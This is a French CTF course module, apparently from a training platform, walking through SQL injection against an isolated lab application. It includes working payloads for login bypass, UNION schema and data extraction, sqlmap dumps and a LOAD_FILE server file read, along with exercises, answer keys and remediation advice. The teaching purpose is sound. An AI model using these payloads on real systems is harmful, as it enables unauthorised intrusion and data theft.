export default {
  id: 'm11',
  num: 11,
  title: "CTF 03 — Injection SQL de A à Z",
  short: "CTF SQLi",
  icon: "💉",
  xp: 600,
  duration: 120,
  summary: "Parcours CTF d'injection SQL complet : détection manuelle, contournement d'authentification, UNION, extraction du schéma, lecture de fichiers, sqlmap et capture du flag final.",
  objectives: [
    "Détecter une injection SQL avec des tests manuels reproductibles",
    "Contourner une authentification et comprendre la requête sous-jacente",
    "Exploiter une UNION SQLi pour extraire schéma, tables et données",
    "Lire un fichier serveur via une injection et capturer le flag final",
    "Automatiser avec sqlmap tout en gardant la maîtrise du périmètre",
    "Proposer des correctifs durables : requêtes paramétrées et moindre privilège"
  ],
  blocks: [
    {
      t: 'callout', v: 'legal', title: "Cible SQLi de laboratoire",
      x: "La cible <code>sql.ctf.lab</code> (10.10.10.40) est une application PHP/MySQL volontairement vulnérable, isolée. Toutes les requêtes ci-dessous visent uniquement ce lab. Une injection SQL sur un site réel sans autorisation est une infraction, même sans extraction de données : le simple test peut modifier ou verrouiller une base."
    },
    {
      t: 'p',
      x: "L'<strong>injection SQL</strong> consiste à insérer du code SQL dans une entrée utilisateur pour modifier la requête exécutée par le serveur. Elle apparaît quand une application concatène une entrée dans une requête au lieu d'utiliser des <strong>requêtes paramétrées</strong>. L'impact va de la fuite de données à la compromission du serveur, selon les privilèges de la base et les fonctions activées."
    },
    {
      t: 'mini',
      items: [
        { v: 'cyan', h: 'Cible', p: "<code>sql.ctf.lab</code> → <code>10.10.10.40</code>. nginx, PHP 8.1, MySQL 8.0, application « Atlas » de gestion de clients." },
        { v: 'amber', h: 'Flags', p: "<code>FLAG{SQLI_AUTH_BYPASS}</code>, <code>FLAG{SQLI_UNION_DUMP}</code>, <code>FLAG{SQLI_SQLMAP}</code>, <code>FLAG{SQLI_FILE_READ}</code>, <code>FLAG{SQLI_ROOT}</code>." },
        { v: 'lime', h: 'Objectif final', p: "Extraire le compte administrateur, lire un fichier du serveur et récupérer le flag racine de l'application." },
        { v: 'magenta', h: 'Règles', p: "Pas de <code>DROP</code>, pas de <code>UPDATE</code>, pas de déni de service. Lecture seule sur le lab, requêtes limitées." }
      ]
    },
    { t: 'h', x: "11.1 Étape 1 — Reconnaissance de l'application" },
    {
      t: 'p',
      x: "Avant de tester une injection, on cartographie l'application : formulaires, paramètres, cookies et points d'entrée. Chaque paramètre qui influence une requête SQL est candidat : <code>?id=</code>, <code>?cat=</code>, champs de connexion, en-têtes utilisés dans un filtre."
    },
    {
      t: 'code', lang: 'bash', title: "Espace de travail et découverte",
      x: `mkdir -p ~/ctf/sqli/{evidence,notes,flags}
cd ~/ctf/sqli
echo "10.10.10.40 sql.ctf.lab" | sudo tee -a /etc/hosts
nmap -sV -sC -p 22,80 10.10.10.40 -oN evidence/nmap.txt
curl -s http://sql.ctf.lab/ -o evidence/home.html
grep -oE 'href="[^"]+|action="[^"]+' evidence/home.html | sort -u | tee evidence/links.txt`
    },
    {
      t: 'term',
      title: "Surface découverte",
      x: [
        { c: "nmap -sV -sC -p 22,80 10.10.10.40", o: [
          "22/tcp open ssh OpenSSH 8.9p1 Ubuntu",
          "80/tcp open http nginx 1.18.0",
          "| http-title: Atlas — Gestion clients"
        ] },
        { c: "grep -oE 'href=\"[^\"]+|action=\"[^\"]+' evidence/home.html | sort -u", o: [
          'href="/login.php"',
          'href="/search.php?cat=1"',
          'href="/product.php?id=1"',
          'action="/login.php"'
        ] }
      ]
    },
    {
      t: 'callout', v: 'tip', title: "Flag 1 — dans la page d'accueil",
      x: "L'application laisse un commentaire HTML pédagogique sur la page d'accueil. Lire le code source d'une page est un réflexe de base : commentaires, champs cachés et routes oubliées révèlent souvent la technologie et un premier flag."
    },
    {
      t: 'code', lang: 'bash', title: "Lire le code source de la page",
      x: `grep -nE '<!--|FLAG\\{' evidence/home.html | tee evidence/home-comments.txt`
    },
    {
      t: 'term',
      title: "Commentaire révélé",
      x: [
        { c: "grep -nE '<!--|FLAG\\{' evidence/home.html", o: [
          "<!-- Atlas v2.3 — debug: FLAG{SQLI_RECON_COMMENT} -->",
          "<!-- moteur: MySQL 8.0, requêtes concaténées (à corriger) -->"
        ] }
      ]
    },
    { t: 'h', x: "11.2 Étape 2 — Détecter l'injection manuellement" },
    {
      t: 'p',
      x: "On compare le comportement d'un paramètre avec une valeur normale, une valeur qui casse la syntaxe et une valeur qui rétablit la vérité logique. Les trois réponses doivent être différentes : erreur, page vide, page normale. C'est la preuve minimale d'une injection."
    },
    {
      t: 'code', lang: 'bash', title: "Tests de détection",
      x: `curl -s "http://sql.ctf.lab/product.php?id=1" -o evidence/id-1.html
curl -s "http://sql.ctf.lab/product.php?id=1'" -o evidence/id-quote.html
curl -s "http://sql.ctf.lab/product.php?id=1%20AND%201=1--%20-" -o evidence/id-true.html
curl -s "http://sql.ctf.lab/product.php?id=1%20AND%201=2--%20-" -o evidence/id-false.html
wc -c evidence/id-1.html evidence/id-quote.html evidence/id-true.html evidence/id-false.html
grep -iE 'SQL syntax|error|warning' evidence/id-quote.html | head`
    },
    {
      t: 'term',
      title: "Comportement des réponses",
      x: [
        { c: "wc -c evidence/id-1.html evidence/id-quote.html evidence/id-true.html evidence/id-false.html", o: [
          "4120 evidence/id-1.html",
          "980 evidence/id-quote.html",
          "4120 evidence/id-true.html",
          "1140 evidence/id-false.html"
        ] },
        { c: "grep -iE 'SQL syntax|error|warning' evidence/id-quote.html", o: [
          "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"
        ] }
      ]
    },
    {
      t: 'p',
      x: "La réponse <code>1 AND 1=1</code> est identique à <code>id=1</code>, alors que <code>1 AND 1=2</code> renvoie une page vide. Le paramètre est donc injectable et le résultat est booléen. On peut maintenant construire des requêtes plus puissantes."
    },
    { t: 'h', x: "11.3 Étape 3 — Contourner l'authentification" },
    {
      t: 'p',
      x: "Le formulaire de connexion construit probablement une requête du type <code>SELECT * FROM users WHERE username='$u' AND password='$p'</code>. Si l'on ferme la chaîne et que l'on commente le reste, la condition peut devenir toujours vraie. On teste avec un compte connu et une condition logique."
    },
    {
      t: 'code', lang: 'bash', title: "Bypass d'authentification",
      x: `curl -s -i -X POST http://sql.ctf.lab/login.php \\\\
  --data-urlencode "username=admin' OR 1=1-- -" \\\\
  --data-urlencode "password=x" \\\\
  -o evidence/login-bypass.txt

head -40 evidence/login-bypass.txt
grep -iE 'FLAG|dashboard|session' evidence/login-bypass.txt`
    },
    {
      t: 'term',
      title: "Connexion contournée",
      x: [
        { c: "curl -s -i -X POST .../login.php -d \"username=admin' OR 1=1-- -\" -d \"password=x\"", o: [
          "HTTP/1.1 302 Found",
          "Location: /dashboard.php",
          "Set-Cookie: atlas_session=...; HttpOnly",
          "",
          "<!-- FLAG{SQLI_AUTH_BYPASS} -->"
        ] }
      ]
    },
    {
      t: 'callout', v: 'danger', title: "Pourquoi le commentaire suffit",
      x: "Le <code>-- -</code> commente la fin de la requête, ce qui supprime la vérification du mot de passe. Le <code>OR 1=1</code> rend la condition vraie pour toutes les lignes. La première ligne retournée devient la session : souvent l'administrateur, selon l'ordre de la table."
    },
    { t: 'h', x: "11.4 Étape 4 — Déterminer le nombre de colonnes" },
    {
      t: 'p',
      x: "Pour utiliser une <strong>UNION</strong>, il faut connaître le nombre exact de colonnes de la requête d'origine. On incrémente <code>ORDER BY n</code> jusqu'à provoquer une erreur. La dernière valeur valide donne le nombre de colonnes."
    },
    {
      t: 'code', lang: 'bash', title: "Recherche du nombre de colonnes",
      x: `for n in 1 2 3 4 5 6; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://sql.ctf.lab/product.php?id=1%20ORDER%20BY%20$n")
  echo "ORDER BY $n -> $code"
done

curl -s "http://sql.ctf.lab/product.php?id=1%20ORDER%20BY%204" | grep -iE 'error|product' | head`
    },
    {
      t: 'term',
      title: "Colonnes identifiées",
      x: [
        { c: "for n in 1 2 3 4 5 6; do curl -s -o /dev/null -w \"ORDER BY $n -> %{http_code}\\n\" \"...?id=1 ORDER BY $n\"; done", o: [
          "ORDER BY 1 -> 200",
          "ORDER BY 2 -> 200",
          "ORDER BY 3 -> 200",
          "ORDER BY 4 -> 500",
          "ORDER BY 5 -> 500",
          "ORDER BY 6 -> 500"
        ] }
      ]
    },
    { t: 'h', x: "11.5 Étape 5 — UNION et extraction du schéma" },
    {
      t: 'p',
      x: "La requête a trois colonnes. On cherche lesquelles sont affichées dans la page, puis on injecte des fonctions système. <code>database()</code>, <code>user()</code> et <code>version()</code> donnent le contexte. On lit ensuite <code>information_schema</code> pour lister les tables."
    },
    {
      t: 'code', lang: 'bash', title: "UNION : contexte et tables",
      x: `curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,database(),user()--%20-" | tee evidence/union-context.html

curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-" | tee evidence/union-tables.html`
    },
    {
      t: 'term',
      title: "Contexte et tables",
      x: [
        { c: "curl -s '...?id=-1 UNION SELECT 1,database(),user()-- -'", o: ["1 | atlas | atlas@localhost"] },
        { c: "curl -s '...?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -'", o: [
          "users,customers,orders,products,secrets"
        ] }
      ]
    },
    {
      t: 'p',
      x: "La table <code>secrets</code> attire l'attention. On liste ses colonnes, puis on extrait son contenu. On concatène les résultats avec un séparateur pour éviter des dizaines de requêtes."
    },
    {
      t: 'code',
      lang: 'bash', title: "Colonnes et données de la table secrets",
      x: `curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name='secrets'--%20-" | tee evidence/secret-columns.html

curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(id,0x3a,label,0x3a,value),3%20FROM%20secrets--%20-" | tee evidence/secret-values.html`
    },
    {
      t: 'term',
      title: "Flag de l'UNION",
      x: [
        { c: "group_concat(column_name) FROM information_schema.columns WHERE table_name='secrets'", o: ["id,label,value"] },
        { c: "group_concat(id,0x3a,label,0x3a,value) FROM secrets", o: [
          "1:admin_note:FLAG{SQLI_UNION_DUMP}",
          "2:api_key:lab-only-not-real"
        ] }
      ]
    },
    {
      t: 'callout', v: 'warn', title: "Limiter l'extraction",
      x: "En audit, on prouve l'accès avec un échantillon, pas en vidant la base. Ici, la table <code>secrets</code> est minuscule et fictive. Sur un système réel, extraire des données personnelles sortirait du cadre et pourrait constituer une violation du RGPD."
    },
    { t: 'h', x: "11.6 Étape 6 — Automatiser avec sqlmap" },
    {
      t: 'p',
      x: "sqlmap automatise la détection et l'extraction. On commence par un <code>--batch</code> avec un niveau et un risque faibles, on identifie le SGBD, puis on cible une table précise. On journalise tout pour garder la preuve."
    },
    {
      t: 'code', lang: 'bash', title: "sqlmap : détection et dump ciblé",
      x: `sqlmap -u "http://sql.ctf.lab/product.php?id=1" \\\\
  --batch --level=2 --risk=1 \\\\
  --output-dir=evidence/sqlmap \\\\
  --dbs

sqlmap -u "http://sql.ctf.lab/product.php?id=1" \\\\
  --batch -D atlas -T secrets --dump \\\\
  --output-dir=evidence/sqlmap`
    },
    {
      t: 'term',
      title: "Résultat sqlmap",
      x: [
        { c: "sqlmap -u '...?id=1' --batch --dbs", o: [
          "Parameter: id (GET)",
          "Type: boolean-based blind",
          "back-end DBMS: MySQL >= 8.0",
          "available databases [2]:",
          "[*] atlas",
          "[*] information_schema"
        ] },
        { c: "sqlmap -u '...?id=1' --batch -D atlas -T secrets --dump", o: [
          "Table: secrets",
          "+----+------------+---------------------------+",
          "| id | label      | value                     |",
          "+----+------------+---------------------------+",
          "| 1  | admin_note | FLAG{SQLI_UNION_DUMP}     |",
          "| 2  | api_key    | FLAG{SQLI_SQLMAP}         |",
          "+----+------------+---------------------------+"
        ] }
      ]
    },
    { t: 'h', x: "11.7 Étape 7 — Lire un fichier du serveur" },
    {
      t: 'p',
      x: "Si l'utilisateur MySQL possède le privilège <code>FILE</code> et que <code>secure_file_priv</code> l'autorise, on peut lire un fichier avec <code>LOAD_FILE()</code>. On cible un fichier de configuration ou le flag applicatif, jamais des données personnelles. On peut aussi écrire un fichier avec <code>INTO OUTFILE</code>, mais cette étape est destructive et hors périmètre : on se limite à la lecture."
    },
    {
      t: 'code',
      lang: 'bash', title: "Lecture de fichier via UNION",
      x: `curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,LOAD_FILE('/var/www/html/flag.txt'),3--%20-" \\\\
  | tee evidence/file-read.html

curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,@@secure_file_priv,@@version--%20-" \\\\
  | tee evidence/mysql-config.html`
    },
    {
      t: 'term',
      title: "Fichier lu",
      x: [
        { c: "UNION SELECT 1,LOAD_FILE('/var/www/html/flag.txt'),3-- -", o: ["FLAG{SQLI_FILE_READ}"] },
        { c: "UNION SELECT 1,@@secure_file_priv,@@version-- -", o: ["/var/lib/mysql-files/ | 8.0.36"] }
      ]
    },
    {
      t: 'callout', v: 'tip', title: "Du SQL au système",
      x: "La lecture de fichiers transforme une fuite de base en compromission serveur. Si <code>LOAD_FILE()</code> échoue, vérifiez <code>secure_file_priv</code> et les droits du compte MySQL. En défense, l'application ne doit jamais utiliser un compte base avec <code>FILE</code>."
    },
    { t: 'h', x: "11.8 Étape 8 — Capture finale : le flag racine" },
    {
      t: 'p',
      x: "Le flag final est stocké dans une table réservée au rôle administrateur. On peut le lire avec l'UNION, ou via sqlmap. L'important est de documenter la requête exacte et de montrer que le compte applicatif accède à des données qu'il ne devrait jamais voir."
    },
    {
      t: 'code', lang: 'bash', title: "Extraire le flag final",
      x: `curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(username,0x3a,role,0x3a,flag),3%20FROM%20users--%20-" \\\\
  | tee evidence/final-flag.html

grep -oE 'FLAG\\{[^}]+\\}' evidence/final-flag.html | tee flags/all-flags.txt`
    },
    {
      t: 'term',
      title: "Flag racine",
      x: [
        { c: "UNION SELECT 1,group_concat(username,0x3a,role,0x3a,flag),3 FROM users-- -", o: [
          "admin:administrator:FLAG{SQLI_ROOT}",
          "alice:user:FLAG{SQLI_USER_NOTE}"
        ] }
      ]
    },
    { t: 'h', x: "11.9 Récapitulatif de la capture" },
    {
      t: 'table',
      head: ['Étape', 'Action', 'Flag'],
      rows: [
        ['1', "Lire le commentaire HTML", 'FLAG{SQLI_RECON_COMMENT}'],
        ['2', "Détecter l'injection booléenne", "Aucun flag — preuve"],
        ['3', "Contourner le login", 'FLAG{SQLI_AUTH_BYPASS}'],
        ['4', "Compter les colonnes", "Aucun flag — préparation"],
        ['5', "Extraire la table secrets par UNION", 'FLAG{SQLI_UNION_DUMP}'],
        ['6', "Confirmer avec sqlmap", 'FLAG{SQLI_SQLMAP}'],
        ['7', "Lire /var/www/html/flag.txt", 'FLAG{SQLI_FILE_READ}'],
        ['8', "Extraire le flag de la table users", 'FLAG{SQLI_ROOT}']
      ]
    },
    { t: 'h', x: "11.10 Remédiation SQLi" },
    {
      t: 'ul',
      x: [
        "Utiliser des <strong>requêtes paramétrées</strong> (PDO avec <code>prepare()</code> et <code>execute()</code>, mysqli avec <code>bind_param</code>) pour toutes les entrées, y compris les en-têtes et les cookies.",
        "Ne jamais concaténer une entrée dans une requête, même après validation ou échappement manuel.",
        "Appliquer le moindre privilège au compte MySQL : pas de <code>FILE</code>, pas de <code>DROP</code>, pas d'accès à <code>information_schema</code> inutile.",
        "Désactiver l'affichage des erreurs SQL en production et journaliser côté serveur avec un identifiant de corrélation.",
        "Valider les types et les listes blanches pour les paramètres attendus (identifiants numériques, tri, pagination).",
        "Mettre en place un WAF en complément, jamais en remplacement des requêtes paramétrées.",
        "Limiter la casse en cas de fuite : rotation des secrets, chiffrement des données sensibles, surveillance des requêtes anormales."
      ]
    },
    { t: 'h', x: "11.11 Fiches commandes SQLi" },
    {
      t: 'cmdref',
      items: [
        {
          cmd: 'curl', tag: 'Test manuel',
          what: "Envoie des requêtes HTTP avec des charges SQL et permet de comparer les réponses.",
          gives: "Codes HTTP, messages d'erreur, tailles de réponse et contenu extrait.",
          use: "Tester un paramètre, contourner un login, injecter une UNION et lire un fichier.",
          syntax: 'curl -s "URL?param=valeur" ; curl -s -X POST URL -d "champ=charge"',
          example: 'curl -s "http://sql.ctf.lab/product.php?id=1%27%20AND%201=1--%20-"',
          read: "Comparez toujours trois réponses : normale, cassée et logiquement vraie. Une erreur SQL visible est une preuve, mais son absence ne prouve pas l'innocuité."
        },
        {
          cmd: "ORDER BY", tag: 'Colonnes',
          what: "Trie le résultat selon une position de colonne et provoque une erreur si la position n'existe pas.",
          gives: "Le nombre exact de colonnes de la requête d'origine.",
          use: "Préparer une UNION valide en connaissant l'arité de la requête.",
          syntax: "?id=1 ORDER BY n-- -",
          example: "http://sql.ctf.lab/product.php?id=1%20ORDER%20BY%203",
          read: "La dernière valeur qui renvoie 200 est le nombre de colonnes. Une erreur 500 sur n+1 confirme la limite."
        },
        {
          cmd: "UNION SELECT", tag: 'Extraction',
          what: "Fusionne le résultat d'une seconde requête avec la requête d'origine.",
          gives: "Les valeurs injectées dans les colonnes affichées par la page.",
          use: "Lire <code>database()</code>, <code>user()</code>, les tables puis les données.",
          syntax: "?id=-1 UNION SELECT 1,expression,3-- -",
          example: "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,database(),user()--%20-",
          read: "Utilisez un identifiant négatif pour masquer la ligne d'origine. Le nombre et les types de colonnes doivent correspondre."
        },
        {
          cmd: "information_schema", tag: 'Schéma',
          what: "Base de métadonnées MySQL qui décrit les bases, tables et colonnes.",
          gives: "La liste des tables et des colonnes, indispensable pour cibler les données.",
          use: "Lister les tables de la base courante, puis les colonnes d'une table intéressante.",
          syntax: "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
          example: "UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
          read: "Concentrez-vous sur les tables métier et de configuration. Les tables système sont rarement le bon objectif."
        },
        {
          cmd: 'group_concat()', tag: 'Agrégation',
          what: "Concatène plusieurs lignes en une seule chaîne, avec un séparateur optionnel.",
          gives: "Toutes les valeurs d'une colonne en une réponse, ce qui réduit le nombre de requêtes.",
          use: "Extraire plusieurs tables, colonnes ou identifiants en une seule injection.",
          syntax: "group_concat(colonne SEPARATOR ',')",
          example: "group_concat(username,0x3a,role) FROM users",
          read: "La longueur est limitée par <code>group_concat_max_len</code>. Utilisez un séparateur visible comme <code>0x3a</code> (deux-points)."
        },
        {
          cmd: 'LOAD_FILE()', tag: 'Fichiers',
          what: "Lit un fichier du serveur avec les droits du compte MySQL.",
          gives: "Le contenu d'un fichier accessible en lecture par mysqld.",
          use: "Lire un fichier de configuration ou un flag applicatif dans le lab.",
          syntax: "UNION SELECT 1,LOAD_FILE('/chemin/fichier'),3-- -",
          example: "UNION SELECT 1,LOAD_FILE('/var/www/html/flag.txt'),3-- -",
          read: "Nécessite le privilège <code>FILE</code> et un chemin autorisé par <code>secure_file_priv</code>. En défense, retirez ce privilège."
        },
        {
          cmd: 'sqlmap', tag: 'Automatisation',
          what: "Outil d'automatisation de détection et d'exploitation des injections SQL.",
          gives: "Le type d'injection, le SGBD, les bases, les tables et un dump ciblé.",
          use: "Confirmer une injection, identifier le SGBD et extraire une table précise avec <code>--dump</code>.",
          syntax: 'sqlmap -u "URL?param=valeur" --batch --level=2 --risk=1 -D base -T table --dump',
          example: 'sqlmap -u "http://sql.ctf.lab/product.php?id=1" --batch -D atlas -T secrets --dump',
          read: "Commencez avec un risque faible pour ne pas modifier les données. Vérifiez chaque option avant d'augmenter <code>--level</code> ou <code>--risk</code>."
        }
      ]
    },
    { t: 'h', x: "11.12 Glossaire SQLi" },
    {
      t: 'glossary',
      items: [
        { term: 'Injection SQL', def: "Insertion de code SQL dans une entrée pour modifier la requête exécutée par le serveur.", use: "Tester chaque paramètre et utiliser des requêtes paramétrées pour corriger.", ex: "' OR 1=1-- -" },
        { term: 'Requête paramétrée', def: "Requête où les valeurs sont transmises séparément du code SQL.", use: "Correction principale : la base traite l'entrée comme une donnée, jamais comme du code.", ex: 'PDO::prepare / bindValue' },
        { term: 'UNION SQLi', def: "Technique qui ajoute une seconde requête pour lire d'autres données dans les colonnes affichées.", use: "Nécessite le même nombre de colonnes et des types compatibles.", ex: 'UNION SELECT 1,user(),3' },
        { term: 'Injection booléenne', def: "Injection où la réponse change selon une condition vraie ou fausse.", use: "Détecter l'injection sans erreur visible et extraire des données caractère par caractère.", ex: 'AND 1=1 / AND 1=2' },
        { term: 'Injection temporelle', def: "Injection qui provoque un délai conditionnel pour confirmer une hypothèse.", use: "Utile quand aucune différence de contenu n'est observable.", ex: 'SLEEP(5)' },
        { term: 'Injection en aveugle', def: "Injection sans retour direct des données ni message d'erreur.", use: "Combiner conditions booléennes, délais ou canaux hors bande pour extraire l'information.", ex: 'blind boolean / time-based' },
        { term: 'information_schema', def: "Base système décrivant les tables et colonnes de MySQL.", use: "Cartographier le schéma avant de cibler les données.", ex: 'tables, columns' },
        { term: 'Commentaire SQL', def: "Syntaxe qui ignore la fin d'une requête.", use: "Contourner une clause de mot de passe ou tronquer une condition.", ex: '-- - , #, /* */' },
        { term: 'LOAD_FILE', def: "Fonction MySQL de lecture de fichier côté serveur.", use: "Prouver l'impact serveur ; nécessite le privilège FILE.", ex: "LOAD_FILE('/etc/passwd')" },
        { term: 'secure_file_priv', def: "Variable MySQL qui limite les répertoires accessibles aux opérations de fichier.", use: "Vérifier sa valeur avant de tenter une lecture ou une écriture.", ex: '/var/lib/mysql-files/' },
        { term: 'Moindre privilège', def: "Principe de donner à un compte uniquement les droits nécessaires.", use: "Le compte applicatif ne doit pas pouvoir lire des fichiers ni supprimer des tables.", ex: 'SELECT, INSERT seulement' },
        { term: 'WAF', full: 'Web Application Firewall', def: "Filtre qui détecte et bloque des requêtes malveillantes.", use: "Complément de défense, jamais un substitut aux requêtes paramétrées.", ex: 'ModSecurity, CRS' }
      ]
    }
  ],
  exos: [
    {
      id: 'm11-e1',
      title: 'Scanner la cible SQL',
      context: "Vous démarrez le CTF sur <code>sql.ctf.lab</code> (10.10.10.40).",
      task: "Lancez un scan Nmap avec versions et scripts sur les ports 22 et 80, et enregistrez-le dans <code>evidence/nmap.txt</code>.",
      hint: "Utilisez <code>nmap -sV -sC -p 22,80 10.10.10.40 -oN evidence/nmap.txt</code>.",
      accept: [/nmap\s+-sV\s+-sC\s+-p\s*22,80\s+10\.10\.10\.40\s+-oN\s+evidence\/nmap\.txt/i],
      solution: 'nmap -sV -sC -p 22,80 10.10.10.40 -oN evidence/nmap.txt',
      output: [
        '22/tcp open ssh OpenSSH 8.9p1 Ubuntu',
        '80/tcp open http nginx 1.18.0',
        '| http-title: Atlas — Gestion clients'
      ],
      read: "L'application est servie par nginx. SSH est ouvert mais aucun identifiant n'est connu : l'application web est la surface principale.",
      pivot: "Lisez la page d'accueil et son code source pour trouver les paramètres et les commentaires."
    },
    {
      id: 'm11-e2',
      title: "Cartographier les points d'entrée",
      context: "La page d'accueil contient des liens vers plusieurs pages paramétrées.",
      task: "Téléchargez la page d'accueil dans <code>evidence/home.html</code>, puis extrayez les valeurs des attributs <code>href</code> et <code>action</code>.",
      hint: "Utilisez <code>curl -s -o evidence/home.html</code> et <code>grep -oE 'href=\"[^\"]+|action=\"[^\"]+'</code>.",
      accept: [/curl\s+-s\s+http:\/\/sql\.ctf\.lab\/?\s+-o\s+evidence\/home\.html.*grep\s+-oE\s+["']href=.*action=/i],
      solution: 'curl -s http://sql.ctf.lab/ -o evidence/home.html && grep -oE \'href="[^"]+|action="[^"]+\' evidence/home.html | sort -u',
      output: [
        'href="/login.php"',
        'href="/search.php?cat=1"',
        'href="/product.php?id=1"',
        'action="/login.php"'
      ],
      read: "Trois paramètres sont candidats : <code>cat</code>, <code>id</code> et les champs du formulaire de login.",
      pivot: "Testez <code>product.php?id=</code> en premier : un identifiant numérique est un candidat classique."
    },
    {
      id: 'm11-e3',
      title: "Lire le premier flag dans le HTML",
      context: "Le code source de la page d'accueil contient un commentaire de debug.",
      task: "Recherchez les commentaires HTML et les chaînes <code>FLAG{</code> dans <code>evidence/home.html</code>.",
      hint: "Utilisez <code>grep -nE '&lt;!--|FLAG\\{' evidence/home.html</code>.",
      accept: [/grep\s+-nE\s+["'].*FLAG.*evidence\/home\.html/i],
      solution: "grep -nE '<!--|FLAG\\{' evidence/home.html",
      output: [
        "<!-- Atlas v2.3 — debug: FLAG{SQLI_RECON_COMMENT} -->",
        "<!-- moteur: MySQL 8.0, requêtes concaténées (à corriger) -->"
      ],
      read: "Le commentaire révèle un flag, la version de MySQL et une erreur de conception : les requêtes sont concaténées.",
      pivot: "Confirmez l'injection sur <code>product.php?id=</code> avec une apostrophe et des conditions vraies/fausses."
    },
    {
      id: 'm11-e4',
      title: 'Détecter une injection booléenne',
      context: "Vous devez comparer la réponse normale et une condition toujours fausse.",
      task: "Appelez <code>product.php?id=1 AND 1=2-- -</code> (URL-encodé) et affichez la taille de la réponse.",
      hint: "Utilisez <code>curl -s -o /dev/null -w '%{size_download}'</code> avec <code>1%20AND%201=2--%20-</code>.",
      accept: [/curl\s+-s\s+.*-w\s+.*size_download.*1%20AND%201=2--%20-/i],
      solution: "curl -s -o evidence/id-false.html -w '%{size_download}\\n' 'http://sql.ctf.lab/product.php?id=1%20AND%201=2--%20-'",
      output: ['1140'],
      read: "La page fausse est nettement plus courte que la page normale (4120 octets). La condition influence la requête : l'injection est confirmée.",
      pivot: "Un login vulnérable permet souvent d'aller plus vite. Testez le formulaire avec <code>' OR 1=1-- -</code>."
    },
    {
      id: 'm11-e5',
      title: "Contourner l'authentification",
      context: "Le formulaire de connexion concatène le nom d'utilisateur dans la requête.",
      task: "Envoyez un POST à <code>/login.php</code> avec <code>username=admin' OR 1=1-- -</code> et <code>password=x</code>, puis enregistrez la réponse dans <code>evidence/login-bypass.txt</code>.",
      hint: "Utilisez <code>--data-urlencode</code> pour l'apostrophe et l'espace.",
      accept: [/curl\s+-s\s+-i?\s*-X\s+POST\s+http:\/\/sql\.ctf\.lab\/login\.php.*admin'\s*OR\s*1=1--\s*-.*evidence\/login-bypass\.txt/is],
      solution: "curl -s -i -X POST http://sql.ctf.lab/login.php --data-urlencode \"username=admin' OR 1=1-- -\" --data-urlencode 'password=x' -o evidence/login-bypass.txt",
      output: [
        'HTTP/1.1 302 Found',
        'Location: /dashboard.php',
        'Set-Cookie: atlas_session=...; HttpOnly',
        '<!-- FLAG{SQLI_AUTH_BYPASS} -->'
      ],
      read: "La condition devient vraie et la vérification du mot de passe est commentée. La session ouverte correspond probablement à l'admin.",
      pivot: "Le dashboard peut contenir d'autres fonctionnalités. Mais l'objectif est d'extraire la base : passez à l'UNION."
    },
    {
      id: 'm11-e6',
      title: 'Trouver le nombre de colonnes',
      context: "Une UNION exige de connaître le nombre de colonnes de la requête d'origine.",
      task: "Testez <code>ORDER BY 1</code> à <code>ORDER BY 6</code> sur <code>product.php?id=1</code> et affichez le code HTTP de chaque essai.",
      hint: "Utilisez une boucle <code>for n in 1 2 3 4 5 6</code> avec <code>curl -o /dev/null -w '%{http_code}'</code>.",
      accept: [/for\s+n\s+in\s+1\s+2\s+3\s+4\s+5\s+6.*http_code.*ORDER%20BY/is],
      solution: 'for n in 1 2 3 4 5 6; do code=$(curl -s -o /dev/null -w "%{http_code}" "http://sql.ctf.lab/product.php?id=1%20ORDER%20BY%20$n"); echo "ORDER BY $n -> $code"; done',
      output: [
        'ORDER BY 1 -> 200',
        'ORDER BY 2 -> 200',
        'ORDER BY 3 -> 200',
        'ORDER BY 4 -> 500',
        'ORDER BY 5 -> 500',
        'ORDER BY 6 -> 500'
      ],
      read: "Trois colonnes valides, erreur à partir de 4. L'UNION devra donc comporter exactement trois expressions.",
      pivot: "Injectez <code>UNION SELECT 1,database(),user()</code> pour vérifier quelles colonnes sont affichées."
    },
    {
      id: 'm11-e7',
      title: "Lire le contexte avec UNION",
      context: "Vous connaissez l'arité de la requête : trois colonnes.",
      task: "Appelez <code>product.php?id=-1 UNION SELECT 1,database(),user()-- -</code> et enregistrez la réponse dans <code>evidence/union-context.html</code>.",
      hint: "Utilisez un identifiant négatif et l'encodage <code>%20</code> pour les espaces.",
      accept: [/curl\s+-s\s+.*-1%20UNION%20SELECT%201,database\(\),user\(\).*evidence\/union-context\.html/i],
      solution: 'curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,database(),user()--%20-" -o evidence/union-context.html',
      output: ['1 | atlas | atlas@localhost'],
      read: "La base s'appelle <code>atlas</code> et le compte MySQL est <code>atlas@localhost</code>. Le nom de la base suffit pour interroger <code>information_schema</code>.",
      pivot: "Listez les tables avec <code>group_concat(table_name)</code> filtré sur <code>database()</code>."
    },
    {
      id: 'm11-e8',
      title: 'Lister les tables',
      context: "Vous devez identifier les tables de la base <code>atlas</code>.",
      task: "Injectez une UNION qui affiche <code>group_concat(table_name)</code> depuis <code>information_schema.tables</code> pour la base courante.",
      hint: "Ajoutez <code>WHERE table_schema=database()</code>.",
      accept: [/UNION%20SELECT%201,group_concat\(table_name\),3%20FROM%20information_schema\.tables%20WHERE%20table_schema=database\(\)/i],
      solution: 'curl -s "http://sql.ctf.lab/product.php?id=-1%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-"',
      output: ['users,customers,orders,products,secrets'],
      read: "Cinq tables, dont <code>users</code> et <code>secrets</code>. La table <code>secrets</code> est la piste la plus directe.",
